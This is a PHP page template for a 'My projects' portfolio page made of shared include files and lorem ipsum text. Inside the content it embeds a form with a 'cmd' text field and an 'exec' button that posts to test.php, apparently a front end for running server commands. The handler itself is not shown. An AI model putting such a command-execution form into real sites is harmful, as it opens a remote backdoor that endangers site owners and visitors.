<html>
<body>

<?php include $_SERVER['DOCUMENT_ROOT']."/common/head.php"; ?>
<?php include $_SERVER['DOCUMENT_ROOT']."/common/navbar.php"; ?>

<div class="container-fluid text-center">    
  <div class="row content">

<?php include $_SERVER['DOCUMENT_ROOT']."/common/left.php"; ?>
  
  <div class="col-sm-8 text-left"> 
      <h1>My projects</h1>
      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
	<form action="./test.php" method="post">
	<input type="text" name="cmd">
	<input type="submit" value="exec">
	</form>

      <hr>
      <h3>Test</h3>
      <p>Lorem ipsum...</p>
    </div>

<?php include $_SERVER['DOCUMENT_ROOT']."/common/right.php"; ?>

  </div>
</div>

<?php include $_SERVER['DOCUMENT_ROOT']."/common/footer.php"; ?>

</body>
</html>

